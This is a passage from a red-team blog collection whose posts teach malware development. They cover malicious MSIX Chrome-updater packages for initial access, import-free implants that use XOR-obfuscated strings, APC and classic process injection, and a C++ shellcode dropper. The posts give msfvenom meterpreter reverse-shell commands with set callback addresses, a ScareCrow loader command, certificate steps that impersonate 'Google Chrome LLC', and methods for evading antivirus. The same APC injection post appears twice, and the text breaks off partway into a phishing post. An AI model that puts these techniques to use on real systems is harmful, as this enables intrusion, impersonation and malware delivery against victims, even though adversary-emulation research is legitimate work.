[{"content":" Introduction # I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation. Part of the observed TTPs was abuse of the Windows App installer to create malicous Chrome updater files for initial access. These updater files come in (.msix) file extension which is a windows installer package. In this article, we will go over the .msix file format to understand how exactly this package format can be used to execute malicious code on an unsuspecting victim. We will then analyze a malicious sample and further attempt to recreate and test it in a virtual environment. The MSIX File Format # Packaging of files in Windows has undergone several changes over the course of years which has led to the rise of various packaging file formats such as the EXE, MSI, APPX and a newer generation such as the MSIX which combines features from the MSI and the APPX packaging. Packaging is important for delivery and distribution of applications as it enables a simplified way of deploying and installing files by packaging all the necessary components and libraries into a single package that is straighforward to use. The general MSIX file format can be deconstructed as shown: 1. Package Payload # Application Files: This section contains the necessary appllications required for the packaged application to run. These can be EXEs, DLLs, Config files, resource files or any other type of file. 2. Footprint Files # AppxManifest.xml: This file contains metadata about the app apackage such as the entry points, capabilities, names of the package, version, publisher, dependencies, etc. AppxBlockMap.xml: To ensure file integrity, this file will contain the checksums of all the files in the package AppxSignature.p7x: The digital signature verifying the publisher\u0026rsquo;s identity and ensures that a package has not been tampered with CodeIntegrity.cat: This file keeps a cryptographic catalogue file(hence the extension name) to ensure integrity and security of the package Why MSIX # One interesting feature about the MSIX package format is that it supports differential updates, meaning, only the parts of the application that have changed can be updated using a single setup file. This allows for creation of udpater files for various applications such as Chrome in this case. Package Support Framework # The Package Support Framework (PSF), is an open source kit in windows designed to facilitate installation and operation of applications in Windows. It helps one apply fixes to an application without modifying code.\nIt allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing tob modify the original code.\nIn the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let\u0026rsquo;s discuss the various components.\nConfig.JSON: Contains settings and parameters for the PSF. PsfLauncher.exe: The initial launcher that initiates the framework. Runtime Manager dll: Dll responsible for managing runtime operations within the framework Runtime fix dll: Dll that provides runtime fixes and patches required by the application StartingScriptWrapper.ps1 # PSF can be used to define post-installation scripts, which will be executed either before or after the application that was packaged has been run. To perform this, a configuration item called the StartingScriptWrapper can be defined to tell PSF to run a script after the packaged application finishes installing. We can use this to run scripts to stage our implants for Initial Access Analysis of a malicious sample # Let us look at a malicious sample from malwarebazaar. Once you\u0026rsquo;ve downloaded and unzipped the sample, you will be presented with the following folder structure In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure it\u0026rsquo;s correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.\n4 files are of interest to us:\nAppxManifest Config.json StartingScriptWrapper usJzY AppxManifest # I highlighted 2 important sections here. The properties and the applications section. The properties contains details identifying the application such as the name, description and the logo that the app uses. In the applications section, we can see the PSF executable being launched. There is also a notepad shortcut being created in the common programs folder. The capabilities section is used to specify systemn capabilities that the application requires in order to grant it access to some system resources and functionalities. Our malware is requesting full trust/unrestricted aceceess to system resources via the runFullTrust capability. Config.json # This is where things start to get interesting! The PSF executable will be launched. scriptExecutionMode has been set to RemoteSigned, which allows scripts that are downloaded from the internet to run if signed by a trusted publisher. The start script section defines usJzY.ps1 as the script that will be executed at the start. showWindown has been set to false, meaning the powershell script will run in the background without invoking the command window. StartingScriptWrapper # The StartingScriptWrapper is required by the PSF to be able to run the target script. The file below is included by default without any special modifications. usJzY # Finally, we have the target script that is being executed by PSF. In summary, this is what the script is performing:\nStarts as a background job and collects some system information such as the domain name, AV software present in the system and the domain name (line 2-11) Pulls a suspicious script from a remote URL and executes it. (line 20-80) Finally opens https://asana.com in the browser then waits for the background job to finish executing before exiting. This is what will contain the main logic for the implant being staged.\nBuilding a malicious msix for Initial Access # Now that we have a solid understanding of the file structure. Let us construct our own malicious MSIX payload that performs a Chrome update when installing before executing our target malware. 1. Setting up the MSIX packaging tool and our setup file # First, you will need to install the MSIX packaging tool from the Microsoft Store You will also need the Chrome setup file or whichever application you will be packaging. 2. The implant being staged # We can quickly create a simple implant for the initial access. I will utilize an awesome repo called Scarecrow which I came across a while back that can create payloads that mimics reputable sources. We create our shellcode with msfvenom msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 -f raw \u0026gt; protection.bin Then generate the loader using Scarecrow ./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES Host the final loader 3. Create an SSL certificate # When running the MSIX file, Windows will check for the digital signature of the file to ensure it is legitimate and has not been tampered with. If you were to create an MSIX file without signing it, Windows will throw an error to you rejecting the installation process. Threat actors will buy or use stolen certificates in order to create legitimately signed files. For this example, we will work with our own self signed certificate, which we will install the corresponding public key on the target machine in order to bypass the warnings and errors. Create a new self signed certificate New-SelfSignedCertificate -CertStoreLocation \u0026#34;Cert:\\CurrentUser\\My\u0026#34; -TextExtension @(\u0026#34;2.5.29.37={text}1.3.6.1.5.5.7.3.3\u0026#34;, \u0026#34;2.5.29.19={text}\u0026#34;)-Type Custom -KeyUsage DigitalSignature -Subject \u0026#34;Google Chrome LLC\u0026#34; -FriendlyName \u0026#34;Google Chrome LLC\u0026#34; Subject must much the MSIX\u0026rsquo;s Publisher attribute value.\nYou can find the thumbprint of the certificate like this Set-Location Cert:\\CurrentUser\\My Get-ChildItem | Format-Table Subject, FriendlyName, Thumbprint Export the private key which we will use to sign the MSIX $password = ConvertTo-SecureString -Force -AsPlainText -String pass123 Export-PfxCertificate -Password $password -cert \u0026#34;Cert:\\CurrentUser\\My\\1BB13615AD20D8101348EA03BC077E0BBE95D792\u0026#34; -FilePath C:\\Users\\Saudi\\cert.pfx Export the public key which we will install in the victim\u0026rsquo;s computer Export-Certificate -cert \u0026#34;Cert:\\CurrentUser\\My\\1BB13615AD20D8101348EA03BC077E0BBE95D792\u0026#34; -FilePath \u0026#39;C:\\Users\\Saudi\\cert.cer\u0026#39; 4. Bundle the package and stage our loader # Select the task and follow through the prompts Select the Chrome setup file as the installer being packaged and select the pfx certificate we generated. Add the package information You can ","date":"11 June 2024","permalink":"/posts/2024-06-11_asd/","section":"Posts","summary":"Introduction # I recently worked on a project involving adversary emulation of the BlackCat/ALPHV ransomware operation.","title":"Creating malicious [.msix] Chrome Updater files for initial access"},{"content":" Introduction # Modern AV solutions primarily work in 2 ways: static and dynamic analysis. Static analysis involves detecting known malicious signatures by comparing them with a database of known malicious signatures. It also involves identifying suspicious characteristics and patterns with how the malware behaves by analysing behavioural signatures. Dynamic analysis involves monitoring the program\u0026rsquo;s behaviour in real-time to determine whether it is malicious. This article primarily focuses on the first method, looking at techniques that would help us break common signatures such as suspicious strings and imports that a malware has. We begin by understanding how exactly PE files resolve imports, how various PE data structures such as the IAT work, and how we can build malware that has 0 imports by dynamically resolving all windows APIs. Static Linking # When creating a program using Windows APIs, the functions in your program are linked against the respective import libraries. The operating system\u0026rsquo;s loader will resolve the functions\u0026rsquo; addresses at the time the application starts (compile time) and will not run if there are missing functions. Dynamic Linking # Using GetModuleHandle and GetProcAddress allows you to resolve function addresses during the execution of your program, i.e., at runtime. This does not create a hard dependency on a DLL and when the DLL or the function is missing, your application can handle the error gracefully, perhaps by notifying the user or falling back to alternative functionality. When using dynamic linking in developing malware, the malware will not directly reference any suspicious imports in a recognizable way until it is actually running. We will use this technique to build malware with virtually 0 imports! How does dynamic linking work? # When a program starts, PE loader (responsible for loading PE files from disk) inspects the binary file, identifying external libraries that it depends on The external libraries are located and loaded into memory The program contains symbols or references that point to the functions and data contained in the external libraries The PE loader resolves these references by updating the program\u0026rsquo;s memory addresses to point to the corresponding locations in the loaded libraries (symbol resolution) The program can now call functions and access data from external libraries as if it were part of the program To accomplish this, various Windows data structures are involved: Import Directory Table # The import information of a PE begins with the import directory table. This generally entails various Windows structures such as pointers to the Import Lookup Table and the Import Address Table, which resolve addresses within imported DLLs.\nSome of its key components are described below:\nImage Import Directory # This is a data structure that is located within a PE file. It plays a crucial role in dynamic resolving of functions and APIs, by allowing programs to import and utilize external libraries during runtime. Structure of the Image Import Descriptor # The structure of the IID in a PE is defined as follows: typedef struct _IMAGE_IMPORT_DESCRIPTOR { union { DWORD Characteristics; DWORD OriginalFirstThunk; } DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk; } IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; The main elements we are concerned in are: OriginalFirstThunk - stores a pointer to an array of function names or ordinals (numeric values that are associated with functions) which are located in the import lookup table. Name - holds a pointer to the name of the imported DLL. FirstThunk - points to an array of function pointers, stored in the imported address table. These function pointers will be updated with the actual memory addresses of the functions in the imported DLL. Import Lookup Table (ILT) # Also referred to as the Import Name Table (INT). It is a table of function names/references that tell the loader which functions are needed from the DLL being imported. It is especially useful in function forwarding, where function calls are redirected from one DLL to another for the purpose of delegating other functions to other DLLs Hint/Name Table # This structure is defined in the Windows Internals header file winnt.h as shown below: typedef struct _IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[1]; } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME; Hint is a number that is used to look up a function. It is an index to the export name pointer table (contains pointers to functions exported from a DLL) If the index lookup fails, a binary search on the name is performed on the export name pointer table to find the function. Import Address Table (IAT) # Similar to the ILT in that it contains addresses of functions and data items that are imported from external dynamic-link libraries. It differs because the IAT is overwritten with the actual addresses of imports during the program runtime.\nThe functioning of the Import Directory Table can be summarized as shown in the diagram below:\nGetModuleHandle \u0026amp; GetProcAddress # GetModuleHandle is used to retrieve a handle to a given module. The module can be a DLL e.g kernel2.dll. The handle can be passed to GetProcAddress to retrieve the address of an exported function from the DLL.\nIn summary, the two are used to locate function addresses. Instead of statically linking to functions, which can be easily detected during static analysis, we can use these 2 functions to dynamically resolve function addresses at runtime.\nThis means that malware does not have to reveal which functions it intends to call.\nTheir implementations are as follows:\nImplementation # We are going to integrate GetModuleHandle and GetProcAddress into an example from our previous blogs. Before we proceed, let us see a simple example using MessageBoxW API and how we can dynamically resolve that API at runtime. Let us break it down further to understand what is happening: Line 6\nWe begin by obtaining a handle to the DLL that contains the functions we will utilize HMODULE user32Dll = GetModuleHandle(L\u0026#34;user32.dll\u0026#34;); Line 9-15\nWe proceed to define a new data type using typedef. The data type being defined is a function pointer that has a signature exactly like the MessageBoxW API. The function pointer is of type WINAPI GetProcAddress is used to locate the MessageBoxW function address from the DLL. It returns a pointer of type FARPROC, a generic pointer to a function in a DLL. Since we now have a function pointer called pMessageBoxW , we need to typecast it so that the compiler knows how to handle the pointer i.e calling convention, paramters, return value that the MessageBoxWFunc function expects. typedef int (WINAPI* MessageBoxWFunc)( HWND hwnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType ); MessageBoxWFunc pMessageBoxW = (MessageBoxWFunc)GetProcAddress(user32Dll, \u0026#34;MessageBoxW\u0026#34;); Line 22\nWe finally invoke the pMessageBoxW function.\nIf we apply the same logic to our shellcode execution implant, we end up with the following:\nThere are 2 issues to address with this kind of implementation. 1. Strings Obfuscation # If we check the strings on the compiled program, it reveals API strings that were used in the program (line 41 - 44). When an antivirus is performing static detection, the suspicious strings will get picked up. We can get around this by encrypting the suspicious strings using XOR, and decrypting them before using them. You can use Cyberchef to perform the strings encryption. The final XOR implementation is as shown. Note that I added null-terminating characters 0x00 for our strings: We successfully get rid of all suspicious strings. 2. Reducing all our imports to 0 # Our code statically links to GetModuleHandle and GetProcAddress Windows APIs. When viewed in the Import Address Table, we see these 2 which may raise suspicion with some antiviruses. The workaround we cover in this blog is to link a manual implementation of the 2 APIs to our program so that instead of relying on the Windows APIs, we use our implementations that parse the various DLLs and locate our needed functions. The main chunk of the implementation has been provided below. The code might look complex but it\u0026rsquo;s actually straightforward if you understand the purpose of GetProcAddress and GetModuleHandle. The implementations of GetProcAddress and GetModuleHandle work as follows: hlpGetModuleHandle Function # This function retrieves the Process Environment Block (PEB) for the current process. This structure contains information about the loaded DLLs in a process. If no module has been provided, it returns the base address of the calling module. GetModuleHandle API works exactly like this, where passing NULL as the module name retrieves the handle to the file used to create the calling process (usually the executable file) The PEB contains a structure called LDR which has information about the loaded DLL within a process. It has a linked-list called InLoadOrderModuleList containing names of our modules, which we iterate through to find our desired module. We compare the BaseDllName of each module entry with sModuleName and return the base address of the module we find. If no match we return NULL. hlpGetProcAddress Function # This function parses the main headers and structures from the obtained module handle to access information about functions that have been exported by a module. If sProcName has been provided as an ordinal, it directly looks up the address in the Export Address Table using the ordinal. If sProcName is a function name, we search the table of function names to find a match. If we find a match, we retrieve the function\u0026rsquo;s address and return it, otherwise, we return NULL. Project Files # The complete project files are linked here The final implant code fully encrypts all suspicious strings and dynamically resolves all our functions: Compilation and Running # The project includes a compile.bat file to help with the compilation and linking of the implant and helper files. You can do it as shown: Verifying Zero Imports # If you open the compiled implant on PEBear, the imports are zero as shown: References # https://institute.sektor7.net/rto-maldev-intermediate\n","date":"24 September 2023","permalink":"/posts/2023-09-24_red_team05/","section":"Posts","summary":"Introduction # Modern AV solutions primarily work in 2 ways: static and dynamic analysis.","title":"Malware development: Building malware with 0 imports"},{"content":" Introduction # In our previous blog post, we looked into classic process injection, going into the various techniques such as finding target processes to inject to using Windows APIs, as well as injecting into the said processes. There are several methods to perform process injection, we will dive into APC Injection, a more advanced technique, that offers more advantages to the standard method. Why? # This method is harder to detect than the standard process injection. Despite implementing some common APIs used in malware development such as VirtualAllocEx, WriteProcessMemory and OpenProcess, the major difference is in how shellcode is executed. Traditional process injection executes shellcode using CreateRemoteThread. This API is overtly suspicious and will get flagged by the AV. APC injection uses an API called QueueUserAPC, which is less suspicious since it is used in normal OS operations such as scheduling work for a thread when it becomes idle. -Let\u0026rsquo;s dive into what some of these technical terms mean. Program Execution in Modern Operating Systems # When programs are executed in Windows, the operating system allocates necessary resources to the program to start the execution. During the execution, multiple threads are usually assigned to a program. A thread in this case represents a sequence of instructions in the program that can be scheduled by the OS to run. These threads could be performing tasks such as accessing OS resources. If a program needs to perform I/O operations such as reading data from files, it uses synchronous calls, which halts the execution of the thread to allow the I/O operation to take place. To address this inefficiency issue, modern Operating Systems will provide support for asynchronous calls. This allows the thread to continue execution after handing over the I/O operation to the OS. Asynchronous Procedure Calls # When an asynchronous I/O operation is completed, the operating system can queue an APC associated with that I/O operation. The APC can contain some code or a function that is executed in response to the completion of the I/O event. This requires a thread to be in an alertable state, which is when a thread is idle and ready to receive Asynchronous Procedure Calls. This allows the OS to deliver the APC to the thread hence executing the code. In our case, we will be creating an APC routine that points to our shellcode so that when the APC fires, our shellcode executes! QueueUserAPC() # This Windows API allows an application to queue an APC to a specified thread. Its implementation is as follows: pfnAPC: This is a pointer to the function that you want to be executed asynchronously. This function will be invoked when the thread is in a state where it can process APCs (also known as an alertable state).\nhThread: This is a handle to the thread to which you want to queue the APC. A handle can be thought of as a unique identifier used to interact with a resource, in our case this will be a specific thread.\ndwData: This is the data that you want to pass to the APC function. It\u0026rsquo;s a single number (an integer, technically a ULONG_PTR) that can be used for whatever you want. It is up to you to decide what you want for this value (error code, status code, commands)\nImplementing the QueueUserAPC() API # I will demonstrate a simple example of how we queue an APC in C++. We will create a thread and execute it. After its execution, we will then queue our APC and see how it gets executed. Starting with an empty C++ project. Import the Windows.h header and create a simple thread as shown. ThreadProc is a callback function that will be executed by CreateThread() as a thread. We can use print statements to show that the thread is being executed. We use wprintf to print out our messages. It is similar to printf but is used to print wide-character strings. It takes in wide character literals indicated by the prefix L GetLastError is used to grab the last error code value When CreateThread is called, it may return before ThreadProc finishes executing. That is why we use the sleep function inside the main() function to allow ThreadProc to finish executing. We finally queue in our APC using the QueueUserAPC function. Remember that we mentioned we can only queue in threads that have been put in an alertable state. So how do you do this? msdn docs describes this as shown in the screenshot below. TLDR; We can use the SleepEx function to make our thread alertable before queueing in the APC. We adjust our code by adding the API and a callback function that will be queued in after the thread has been executed. The callback function has a parameter called Parameter, which contains the data that is passed in the dwData parameter in the QueueUserAPC() function, which was 123. We can print it out as well to confirm that as shown in line 22 It executes as shown: Note that SleepEx returned 192. In the msdn docs, the return value of sleepex is WAIT_IO_COMPLETION if the callback is completed. WAIT_IO_COMPLETION is a return code whose value is 0xC0 which is 192 in decimal Implementing QueueUserAPC() in our implant. # High-Level Overview # We now have some understanding of how QueueUserAPC works. A high-level breakdown of how the implementation works is as follows. Create the target process in a suspended state. Allocate memory using VirtualAllocEx in the suspended process. Define the APC callback routine, it is going to point to our shellcode Write shellcode into the allocated memory within the target process using WriteProcessMemory Queue the APC to the main thread using QueueUserAPC. Once the thread is resumed the shellcode is executed. Key Points\nIn line 38, we define our APC routine using PTHREAD_START_ROUTINE which declares the APC callback as a pointer to a variable. In this case, our variable would be the shellcode defined in line 6. In lines 45 \u0026amp; 46 we define 2 structures necessary in implementation of the CreateProcessA API. We use these structures to access information about the process that we are creating. You can see this in line 52 where we obtain the process id and thread id of notepad. Final demo # Using processhacker, we can further verify our process spawned in the context of notepad as shown. Conclusion # I hope you enjoyed diving deep into how this technique works. You can play around with the code and see if you can implement some form of encryption for the shellcode. Happy hacking !! Project Files # You can find the project files for process injection here References # Red Team Notes ","date":"6 August 2023","permalink":"/posts/2023-08-06_red_team04/","section":"Posts","summary":"Introduction # In our previous blog post, we looked into classic process injection, going into the various techniques such as finding target processes to inject to using Windows APIs, as well as injecting into the said processes.","title":"Malware development: APC Injection with C++"},{"content":" Introduction # In our previous blog post, we looked into classic process injection, going into the various techniques such as finding target processes to inject to using Windows APIs, as well as injecting into the said processes. There are several methods to perform process injection, we will dive into APC Injection, a more advanced technique, that offers more advantages to the standard method. Why? # This method is harder to detect than the standard process injection. Despite implementing some common APIs used in malware development such as VirtualAllocEx, WriteProcessMemory and OpenProcess, the major difference is in how shellcode is executed. Traditional process injection executes shellcode using CreateRemoteThread. This API is overtly suspicious and will get flagged by the AV. APC injection uses an API called QueueUserAPC, which is less suspicious since it is used in normal OS operations such as scheduling work for a thread when it becomes idle. -Let\u0026rsquo;s dive into what some of these technical terms mean. Program Execution in Modern Operating Systems # When programs are executed in Windows, the operating system allocates necessary resources to the program to start the execution. During the execution, multiple threads are usually assigned to a program. A thread in this case represents a sequence of instructions in the program that can be scheduled by the OS to run. These threads could be performing tasks such as accessing OS resources. If a program needs to perform I/O operations such as reading data from files, it uses synchronous calls, which halts the execution of the thread to allow the I/O operation to take place. To address this inefficiency issue, modern Operating Systems will provide support for asynchronous calls. This allows the thread to continue execution after handing over the I/O operation to the OS. Asynchronous Procedure Calls # When an asynchronous I/O operation is completed, the operating system can queue an APC associated with that I/O operation. The APC can contain some code or a function that is executed in response to the completion of the I/O event. This requires a thread to be in an alertable state, which is when a thread is idle and ready to receive Asynchronous Procedure Calls. This allows the OS to deliver the APC to the thread hence executing the code. In our case, we will be creating an APC routine that points to our shellcode so that when the APC fires, our shellcode executes! QueueUserAPC() # This Windows API allows an application to queue an APC to a specified thread. Its implementation is as follows: pfnAPC: This is a pointer to the function that you want to be executed asynchronously. This function will be invoked when the thread is in a state where it can process APCs (also known as an alertable state).\nhThread: This is a handle to the thread to which you want to queue the APC. A handle can be thought of as a unique identifier used to interact with a resource, in our case this will be a specific thread.\ndwData: This is the data that you want to pass to the APC function. It\u0026rsquo;s a single number (an integer, technically a ULONG_PTR) that can be used for whatever you want. It is up to you to decide what you want for this value (error code, status code, commands)\nImplementing the QueueUserAPC() API # I will demonstrate a simple example of how we queue an APC in C++. We will create a thread and execute it. After its execution, we will then queue our APC and see how it gets executed. Starting with an empty C++ project. Import the Windows.h header and create a simple thread as shown. ThreadProc is a callback function that will be executed by CreateThread() as a thread. We can use print statements to show that the thread is being executed. We use wprintf to print out our messages. It is similar to printf but is used to print wide-character strings. It takes in wide character literals indicated by the prefix L GetLastError is used to grab the last error code value When CreateThread is called, it may return before ThreadProc finishes executing. That is why we use the sleep function inside the main() function to allow ThreadProc to finish executing. We finally queue in our APC using the QueueUserAPC function. Remember that we mentioned we can only queue in threads that have been put in an alertable state. So how do you do this? msdn docs describes this as shown in the screenshot below. TLDR; We can use the SleepEx function to make our thread alertable before queueing in the APC. We adjust our code by adding the API and a callback function that will be queued in after the thread has been executed. The callback function has a parameter called Parameter, which contains the data that is passed in the dwData parameter in the QueueUserAPC() function, which was 123. We can print it out as well to confirm that as shown in line 22 It executes as shown: Note that SleepEx returned 192. In the msdn docs, the return value of sleepex is WAIT_IO_COMPLETION if the callback is completed. WAIT_IO_COMPLETION is a return code whose value is 0xC0 which is 192 in decimal Implementing QueueUserAPC() in our implant. # High-Level Overview # We now have some understanding of how QueueUserAPC works. A high-level breakdown of how the implementation works is as follows. Create the target process in a suspended state. Allocate memory using VirtualAllocEx in the suspended process. Define the APC callback routine, it is going to point to our shellcode Write shellcode into the allocated memory within the target process using WriteProcessMemory Queue the APC to the main thread using QueueUserAPC. Once the thread is resumed the shellcode is executed. Key Points\nIn line 38, we define our APC routine using PTHREAD_START_ROUTINE which declares the APC callback as a pointer to a variable. In this case, our variable would be the shellcode defined in line 6. In lines 45 \u0026amp; 46 we define 2 structures necessary in implementation of the CreateProcessA API. We use these structures to access information about the process that we are creating. You can see this in line 52 where we obtain the process id and thread id of notepad. Final demo # Using processhacker, we can further verify our process spawned in the context of notepad as shown. Conclusion # I hope you enjoyed diving deep into how this technique works. You can play around with the code and see if you can implement some form of encryption for the shellcode. Happy hacking !! Project Files # You can find the project files for process injection here References # Red Team Notes ","date":"6 August 2023","permalink":"/posts/2023-09-07_red_team05/","section":"Posts","summary":"Introduction # In our previous blog post, we looked into classic process injection, going into the various techniques such as finding target processes to inject to using Windows APIs, as well as injecting into the said processes.","title":"Malware development: APC Injection with C++"},{"content":" Introduction # In the previous article we explored how we can write a simple stageless C++ dropper. In this article we build upon the capabilities of the dropper by implementing process injection. Process injection is a well-known defense evasion technique that is used to hide code within the address space of another process. This allows an attacker to mask malicious code as a legitimate process in the system. It can also be used as a persistence technique by migrating to stable processes during post-exploitation. High-Level Overview # We begin by selecting a target process i.e notepad.exe. We can select any standard process in the system provided we have the necessary permissions Open the process found and obtain a handle to it Allocate memory within that process through the handle we have Write our shellcode into the memory Execute the injected code. We can summarize the above into 2 main parts: Find a target process Injecting into the target process The final project file can be located here for quick reference: https://github.com/trevorsaudi/Process-Injection-cpp 1. Finding a Target Process # CreateToolhelp32Snapshot # We use this function to create a snapshot of the specified processes in the system. This includes components and activities of the processes. Since we will be enumerating the processes in the system to find our target, we will utilize the TH32CS_SNAPPROCESS parameter that allows us to grab all processes in the system. The second parameter is ignored when we use TH32CS_SNAPPROCESS so we place a 0 for that It returns a handle to the snapshot that\u0026rsquo;s why we define a HANDLE variable for it PROCESSENTRY32 pe32 # This pre-defined windows data structure holds information about a single process when the snapshot was taken. pe32 is an instance of PROCESSENTRY32. pe32.dwSize is a member of the PROCESSENTRY32 data structure. It represents the size of the structure in bytes. We grab the size of the structure using sizeOf Process32First and Process32Next # We will use these 2 APIs to enumerate through the running processes looking for a process with a specific name They both require the size of the structure to determine how much info to retrieve. In line with the code block above, we get the first process from the snapshot we took, where, hProcSnap is a handle to the snapshot of processes and pe32 is a PROCESSENTRY32 structure which will get filled with information about a process.\nIf the block of code fails to get a process for some reason, we close the handle.\nWe now proceed to find the target process below\nWe use Process32Next, to get the information about the next process. This allows us to cycle through the snapshot. We then compare the name of the current process which is stored in pe32.szExeFile with what we are looking for procname. 2. Injecting into the target process # This process involves us allocating memory to our target process, writing to it, and executing the shellcode from the process calling it. VirtualAllocEx # We use this to allocate memory in the target process. The difference between the VirtualAllocEx and VirtualAlloc is that VirtualAlloc allocates memory within the address space of the calling process, while VirtualAllocEx lets you specify a target process to allocate memory. WriteProcessMemory # We use this API to write into the memory in a specified address. We will utilize this to write our shellcode into the memory region we reserved in the target process. CreateRemoteThread # This API is used to create a thread that runs in the address space of a target process. Our target is notepad.exe, this API will help us run our shellcode in that context We specify hProc, a handle to the process that we are injecting to. We then use WaitForSingleObject to specify a timeout for the process. 3. Final Implant # The final process injection implementation: You can compile with cl.exe using the following flags cl.exe /Ox /MT /W0 /GS- /DNDEBUG /Tcprocessinjection.cpp /link /OUT:processinjection.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 Start notepad (or the process you are injecting into) before doing process injection. We can verify the messagebox was spawned in the context of Notepad using Process Hacker. Process Hacker is a tool that can help you monitor resources, debug software and detect malware. It has a functionality called \u0026ldquo;Find Window and Threads\u0026rdquo;, demonstrated below, which you can click then drag to a window to show the kind of resources (processes, threads, handles, etc) it is associated with. We can also see the memory region we had allocated for our target process, marked as RX (Read Executable) as shown below. This brings us to the end of our blog, hope you learned a ton! ","date":"25 July 2023","permalink":"/posts/2023-07-21_red_team03/","section":"Posts","summary":"Introduction # In the previous article we explored how we can write a simple stageless C++ dropper.","title":"Malware development: Process Injection with C++"},{"content":" Introduction # Welcome to another red teaming blog post where we dive into malware development and how we can write malware using C/C++. We will go over some fundamentals such as the PE file structure, Windows APIs then finally see how we can put together a dropper that executes shellcode for us on a target system Prerequisites # Windows 10 box Any IDE Basic programming knowledge Why? # In my red teaming journey, the emphasis on writing custom toolset always plays a big role in understanding the current threat landscape, emulating what adversaries are doing and I guess\u0026hellip; it\u0026rsquo;s just fun! The PE file structure # The portable executable also called the Windows executable file format is a data structure that in Windows that holds information necessary for the execution of files.\nIt is used to organize executable files, object files, DLLs, FON Font files in 32-bit and 64-bit versions of Windows operating systems.\nUnderstanding the organization of file components in a PE is very important when it comes to the design and analysis of malware.\nIn the analysis and development of malware, it is important to be familiar with the PE file structure to understand how malware works on a basic level, what it does from a behavioral analysis point of view, such as how it interacts with the operating system, antivirus or EDR in place and how it communicates externally. etc\nIn its simplest form, the PE file format is organized as follows:\nHeaders # It takes up the first 64 bytes and holds various metadata about the executable file. Its components include: Component Description DOS Header This section identifies an MS-DOS compatible file type using the \u0026ldquo;MZ\u0026rdquo; initials. DOS stub This is what prints out \u0026ldquo;This program cannot be run in DOS mode\u0026rdquo; when executed in DOS. PE File Header Contains the signature that identifies the executable as a PE. Image Optional Header Holds optional information about a PE, such as the base address of the image in memory, sizes of the code/data sections, the entry point relative virtual address, etc. Sections Header Describes attributes of sections in the PE, such as name, size, virtual address, and attributes (readable, writable, executable). Sections # These are the components that make up the PE sections: Component Description .text Contains executable code. .data Holds initialized data. .bss Stores uninitialized data. .rsrc Stores non-executable resources. .idata Lists imported functions and libraries. .edata Lists exported functions and symbols. .pdata Contains exception handling information. .debug Holds debugging-related data. Staged vs Stageless # Both of these are different approaches used in the delivery of malware Stageless malware is standalone self-contained malware that does not rely on external resources to complete execution. Staged malware follows a different approach. It contains multiple processes, usually two or more phases where the first, commonly referred to as the stager, is a small piece of code responsible for establishing a C2 connection with the infrastructure. Its main functionality is to load the subsequent stage of the malware. A common example is the metasploit framework where stageless payloads have the following notation: meterpreter_: 1. payload/windows/meterpreter_bind_tcp While the staged have the following notation: meterpreter/: 2. payload/windows/meterpreter/bind_tcp Both have their cons and pros where we see staged payloads being more evasive and capable of bypassing AVs due to execution of malware in separate stages. Stageless is good when maintaining simplicity but can be bulky to deliver. We will look into both ways of developing this malware. Processes, Threads, Handles # A process is a program in execution. It can be made of different multiple threads executing instructions at the same time. A thread is the smallest unit of execution within a process. Processes can have multiple threads that share the process\u0026rsquo;s resources. A handle is an identifier used to access a resource (files, threads, memory). When a process needs to access resources, the OS will provide a handle that the process will use to access said resources. Shellcode # Shellcode is a set of instructions that is meant to be executed directly by a target system. Once it\u0026rsquo;s executed, it could provide a callback connection to the attacker or execute arbitrary commands on the target. It is typically written in assembly, designed to be super-efficient while leveraging various system calls or APIs to achieve the intended goal We can quickly generate shellcode using msfvenom as follows: ➜ ~ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.100.72 LPORT=443 EXITFUNC=thread -f C Windows APIs # Windows APIs play a key role in malware development as they create a standardized interface for the malware to interact with the Operating System. The Windows API is a collection of functions, data structures, and constants provided by the Windows OS. It allows developers to create applications that can interact with the underlying resources. The APIs are well documented here and we will be using it as a reference MessageBox API # We will write our first program that uses a Windows API (MessageBox) to display some text. The implementation of the API is well documented as shown:\nIn your IDE, we can import the relevant libraries and implement the API as shown in the docs\nHigh-level Overview # At a high level, the dropper\u0026rsquo;s implementation to execute shellcode is as follows: Embed the shellcode to the dropper by using a byte array of the raw hex of the shellcode. Allocate memory on a process for the shellcode to be copied into Copy the shellcode into the allocated memory Execute the shellcode Let\u0026rsquo;s move on to the APIs necessary to implement for our dropper. VirtualAlloc # This API is used in reserving regions of memory within the virtual address space of a process. We will use this to allocate the necessary space for storing the shellcode. RtlMoveMemory # This memory manipulation function is used to copy a block of memory from one location to another. We will use this to copy the shellcode into the memory allocated by VirtualAlloc VirtualProtect # The VirtualProtect function changes the protection settings of a region of virtual memory. We will use it to modify permissions of the memory block we copied our shellcode to, in this case, we add executable and read permissions to be able to execute our shellcode CreateThread # We use this to create a thread that is executed within the address space of another process. This is what runs our shellcode. WaitForSingleObject # It is used to wait until the specified object is in a certain state or until a timeout interval elapses. We use this to have our shellcode running infinitely till a failure is encountered The Stageless implant # Putting together the above APIs, we have the following C++ stageless implant that executes shellcode for us. Note that some of the APIs have optional parameters in which we don\u0026rsquo;t have to put values, we put a 0 in place Exercise # You can build upon the above code by making it staged, such that it pulls shellcode from a remote source, loads it into a byte array then proceeds with the execution routine. ","date":"19 July 2023","permalink":"/posts/2023-07-19_red_team02/","section":"Posts","summary":"Introduction # Welcome to another red teaming blog post where we dive into malware development and how we can write malware using C/C++.","title":"Malware Development: Writing a C++ dropper"},{"content":" Introduction # Phishing attacks have become increasingly sophisticated and prevalent over the years, posing a significant threat to individuals and organizations alike. These attacks aim to steal sensitive information such as login credentials, financial data, and personal information by tricking victims into clicking on 